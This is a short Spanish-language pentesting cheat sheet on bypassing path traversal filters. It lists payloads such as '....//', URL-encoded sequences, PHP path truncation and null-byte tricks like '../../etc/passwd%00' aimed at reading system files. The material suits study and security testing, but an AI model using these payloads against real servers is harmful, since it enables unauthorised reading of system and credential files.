### Non-Recursive Path Traversal Filters

Es un filtro que elimina ../ pero de forma no recursiva asi que se puede bypassear asi :
....//
..././
....////
### Encoding
algunos filtros eliminan ../ pero puedes url encodearlo para bypassearlo

### Appended Extension
-Path Truncation
En versiones antiguas de PHP( antes de PHP 5.3 y 5.4), cadenas > 4096 caracteres se truncaban:
```
non_existing_dir/../../../etc/passwd/./././././ ... (repetido muchas veces)
```
-Null Bytes 
	En PHP <5.5, %00 termina la cadena por ende podriamos hacer ../../etc/passwd%00 para eliminar el .php
